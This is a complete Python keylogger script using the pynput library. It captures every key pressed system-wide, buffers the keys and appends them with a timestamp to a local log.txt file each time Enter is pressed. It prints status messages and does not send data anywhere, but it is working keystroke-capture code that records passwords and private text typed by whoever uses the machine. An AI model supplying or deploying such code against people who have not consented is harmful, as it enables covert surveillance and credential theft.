from pynput.keyboard import Key, Listener

from datetime import datetime

# array that stores keys entered
keys = []


# function called when a key is pressed
def add_key(key):
	global keys
	keys.append(key)

	# adding text to log file when enter is pressed
	if key == Key.enter:
		write_file(keys)

		# making array empty again for new record
		keys = []


# function responsible for adding text to log.txt file
def write_file(keys):

	# opening the log file
	with open("log.txt", "a") as f:

		# storing the current timestamp in variable 'dt'
		dt = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
		dts = dt + " - "

		# writing timestamp to log file
		f.write(dts)

		# looping for all the keys entered
		for key in keys:
			key = str(key).replace("'", "")
			if key.find("Key") == -1:
				f.write(key)
			else:
				key = str(key).replace("Key.", "<")
				key += ">"

				# writing text to log file
				f.write(key)

		# adding a new line after a record is added
		f.write('\n')

		print("Added a record at", dt)


# message printed once the script starts running
print("Script Running. Start Typing and press Enter to save the text")

# listener function
with Listener(on_press=add_key) as listener:
	listener.join()

